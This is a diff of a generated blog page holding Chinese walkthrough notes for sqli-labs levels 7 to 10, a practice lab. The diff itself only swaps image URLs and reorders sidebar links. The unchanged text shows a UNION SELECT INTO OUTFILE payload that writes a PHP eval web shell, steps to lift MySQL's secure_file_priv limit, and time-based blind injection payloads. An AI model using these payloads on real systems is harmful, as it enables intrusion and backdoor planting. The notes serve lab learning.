@@ -102,12 +102,12 @@ Yume Shoka = Fengyuan</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclfdu6exj20zk0m87hw.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giciundwu5j20zk0m8n9e.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclxfdlttj20zk0m8npd.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicm07ih54j20zk0m84qp.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipeyhsblkj20zk0m81kx.jpg"></li>
-          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giciub8ja1j20zk0m81ky.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicliierfjj20zk0m8npd.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclhtuo6nj20zk0m8ttm.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipew8gmvyj20zk0m87wh.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipew28b65j20zk0m8hdt.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicivghyooj20zk0m8dir.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipevo9j1jj20zk0m8e81.jpg"></li>
         </ul>
       </div>
     </header>
@@ -156,35 +156,35 @@ Yume Shoka = Fengyuan</title>
     <hr>
 <p><em><strong>第七关：</strong></em></p>
 <p>我们输入?id=1看回显：</p>
-<p><img src="../images/image-20211001180223390.png" alt="image-20211001180223390"></p>
+<p><img data-src="../images/image-20211001180223390.png" alt="image-20211001180223390"></p>
 <p>提示Use outfile,就是要求我们写入mysql文件，目的是将一句话木马写入到Less-7目录下，我们打开Less-7的目录，发现里面只有index.php文件和result.txt文件。</p>
 <p>执行SQL写文件操作：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)) union select 1,2, &quot;&lt;?php@eval($_POST[&#x27;cmd&#x27;]); ?&gt;&quot; into outfile &quot;D:\\phpstudy\\www\\sqli-labs\\Less-7\\shell.php&quot;--+</span><br></pre></td></tr></table></figure>
 
-<p><img src="../images/image-20211002112651104.png" alt="image-20211002112651104"></p>
+<p><img data-src="../images/image-20211002112651104.png" alt="image-20211002112651104"></p>
 <p>但这里还是提示错误，我们打开看看shell文件，发现确实没有写入。</p>
 <p>那我们来查看一下secure-file-prive参数：</p>
-<p><img src="../images/image-20211002113732787.png"></p>
+<p><img data-src="../images/image-20211002113732787.png"></p>
 <p>这里是NULL</p>
 <p>secure-file-priv是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。</p>
 <p>secure _file_priv的值为null时，表示mysql不允许导入、导出<br>当secure_file_priv的值为/tmp/ ，表示mysql只能导入、导出到/tmp/目录下<br>当secure_file_priv的值没有具体值时，表示不对mysql的导入、导出做限制</p>
 <p>所以现在无法写入文件，那我们就来开启它，打开D:\phpstudy\Extensions\MySQL5.7.26下的my.ini文件，添加secure_file_priv=.</p>
-<p><img src="../images/image-20211002114150259.png" alt="image-20211002114150259"></p>
+<p><img data-src="../images/image-20211002114150259.png" alt="image-20211002114150259"></p>
 <p>保存文件后重启mysql服务</p>
 <p>打开命令行：</p>
-<p><img src="../images/image-20211002114411803.png" alt="image-20211002114411803"></p>
+<p><img data-src="../images/image-20211002114411803.png" alt="image-20211002114411803"></p>
 <p>现在secure_file_prive没有具体值，那我们就可以进行对mysql文件的写入了：</p>
 <p>现在我们再重新写入一遍?id=1’)) union select 1,2, “<?php@eval($_POST['cmd']); ?>“ into outfile “D:\phpstudy\www\sqli-labs\Less-7\shell.php”–+</p>
 <p>现在我们再打开生成的shell文件查看：</p>
-<p><img src="../images/image-20211002114716327.png" alt="image-20211002114716327"></p>
+<p><img data-src="../images/image-20211002114716327.png" alt="image-20211002114716327"></p>
 <p>发现已经写入</p>
 <p>我们打开网页查看一下：</p>
-<p><img src="../images/image-20211002115019211.png" alt="image-20211002115019211"></p>
+<p><img data-src="../images/image-20211002115019211.png" alt="image-20211002115019211"></p>
 <p>连接成功！</p>
 <hr>
 <p><em><strong>第八关：</strong></em></p>
 <p>?id=1’–+页面回显正常，这里是单引号字符型注入：</p>
-<p><img src="../images/image-20211002115815378.png" alt="image-20211002115815378"></p>
+<p><img data-src="../images/image-20211002115815378.png" alt="image-20211002115815378"></p>
 <p>也是基于布尔型盲注，如果SQL查询成功会返回“You are in….”,否则为空，其余详细步骤参考Less-5</p>
 <hr>
 <p><em><strong>第九关：</strong></em></p>
@@ -192,7 +192,7 @@ Yume Shoka = Fengyuan</title>
 <p><em><strong>时间盲注</strong></em>　界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。<br> 　需要用到的函数：</p>
 <figure class="highlight plaintext"><figcaption><span>返回字符串的长度</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Substr（）截取字符串</span><br><span class="line">Ascii（）返回字符的ascii码</span><br><span class="line">sleep(n)：将程序挂起一段时间 n为n秒</span><br><span class="line">if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</span><br></pre></td></tr></table></figure>
 
-<p><img src="../images/image-20211002140425444.png" alt="image-20211002140425444"></p>
+<p><img data-src="../images/image-20211002140425444.png" alt="image-20211002140425444"></p>
 <p>我们输入?id=1’ and sleep(5)–+,发现结果果然延迟5秒才显示，这就说明这里是基于单引号的时间注入。</p>
 <p>那么接下来就可以构造所以我们构造的语句是<br>?id=1’and payload–+语句了</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and if(database()=&#x27;security&#x27;,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
@@ -202,10 +202,10 @@ Yume Shoka = Fengyuan</title>
 
 <p>和布尔型注入相比，无非多了一个sleep(),其他payload和它是大同小异。我们只要看返回是否会延迟，就可以判断查询语句是否存在。</p>
 <p>我们看看后台时间盲注的源码：</p>
-<p><img src="../images/image-20211002141301530.png" alt="image-20211002141301530"></p>
+<p><img data-src="../images/image-20211002141301530.png" alt="image-20211002141301530"></p>
 <p>你看，都是“You are in……”</p>
 <p>我们对比一下第八关的布尔盲注：</p>
-<p><img src="../images/image-20211002141358392.png" alt="image-20211002141358392"></p>
+<p><img data-src="../images/image-20211002141358392.png" alt="image-20211002141358392"></p>
 <p>差异明显。</p>
 <hr>
 <p><em><strong>第十关:</strong></em></p>
@@ -279,7 +279,7 @@ Yume Shoka = Fengyuan</title>
     <div class="item left">
       
 
-  <a href="/2021/09/30/Less-5-6/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giph4wqtg4j20zk0m8x6p.jpg" title="Less 5,6">
+  <a href="/2021/09/30/Less-5-6/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giciryrr3rj20zk0m8nhk.jpg" title="Less 5,6">
   <span class="type">Previous Post</span>
   <span class="category"><i class="ic i-flag"></i> -sqli-labs</span>
   <h3>Less 5,6</h3>
@@ -289,7 +289,7 @@ Yume Shoka = Fengyuan</title>
     <div class="item right">
       
 
-  <a href="/2021/10/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipewf5l51j20zk0m8b29.jpg" title="攻防世界刷题笔记">
+  <a href="/2021/10/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipeyonbf9j20zk0m8e81.jpg" title="攻防世界刷题笔记">
   <span class="type">Next Post</span>
   <span class="category"><i class="ic i-flag"></i> -CTF</span>
   <h3>攻防世界刷题笔记</h3>
@@ -363,8 +363,6 @@ Yume Shoka = Fengyuan</title>
     </div>
   </div>
   
-    
-
   <ul id="quick">
     <li class="prev pjax">
         <a href="/2021/09/30/Less-5-6/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
@@ -394,29 +392,9 @@ Yume Shoka = Fengyuan</title>
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/%E7%9F%A5%E8%AF%86%E5%82%A8%E5%AD%98/" title="In -知识储存">-知识储存</a>
 </div>
 
-    <span><a href="/2021/11/21/%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A0%87%E8%AF%86%E5%A4%A7%E5%85%A8/" title="文件头标识大全(Winhex文件分析)">文件头标识大全(Winhex文件分析)</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-<a href="/categories/sqli-labs/" title="In -sqli-labs">-sqli-labs</a>
-</div>
-
-    <span><a href="/2021/09/29/Less-1-4/" title="Less 1~4">Less 1~4</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
-</div>
-
-    <span><a href="/2021/11/17/autohotkey/" title="autohotkey">autohotkey</a></span>
+    <span><a href="/2021/09/30/sql%20%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/" title="sql 注入简介">sql 注入简介</a></span>
   </li>
 
       
@@ -433,6 +411,35 @@ Yume Shoka = Fengyuan</title>
   <li class="item">
     
 <div class="breadcrumb">
+</div>
+
+    <span><a href="/2021/11/17/autohotkey/" title="autohotkey">autohotkey</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E7%9F%A5%E8%AF%86%E5%82%A8%E5%AD%98/" title="In -知识储存">-知识储存</a>
+</div>
+
+    <span><a href="/2021/11/21/%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A0%87%E8%AF%86%E5%A4%A7%E5%85%A8/" title="文件头标识大全(Winhex文件分析)">文件头标识大全(Winhex文件分析)</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/CTF/" title="In -CTF">-CTF</a>
+</div>
+
+    <span><a href="/2021/10/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="攻防世界刷题笔记">攻防世界刷题笔记</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
 <a href="/categories/CTF/" title="In -CTF">-CTF</a>
 </div>
 
@@ -443,9 +450,10 @@ Yume Shoka = Fengyuan</title>
   <li class="item">
     
 <div class="breadcrumb">
+<a href="/categories/sqli-labs/" title="In -sqli-labs">-sqli-labs</a>
 </div>
 
-    <span><a href="/2021/09/30/sql%20%E6%B3%A8%E5%85%A5%E7%AE%80%E4%BB%8B/" title="sql 注入简介">sql 注入简介</a></span>
+    <span><a href="/2021/09/29/Less-1-4/" title="Less 1~4">Less 1~4</a></span>
   </li>
 
       
@@ -462,15 +470,6 @@ Yume Shoka = Fengyuan</title>
   <li class="item">
     
 <div class="breadcrumb">
-</div>
-
-    <span><a href="/2021/09/28/hello-world/" title="Hello World">Hello World</a></span>
-  </li>
-
-      
-  <li class="item">
-    
-<div class="breadcrumb">
 <a href="/categories/CTF/" title="In -CTF">-CTF</a>
 </div>
 
@@ -481,10 +480,9 @@ Yume Shoka = Fengyuan</title>
   <li class="item">
     
 <div class="breadcrumb">
-<a href="/categories/CTF/" title="In -CTF">-CTF</a>
 </div>
 
-    <span><a href="/2021/10/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="攻防世界刷题笔记">攻防世界刷题笔记</a></span>
+    <span><a href="/2021/09/28/hello-world/" title="Hello World">Hello World</a></span>
   </li>
 
   </ul>
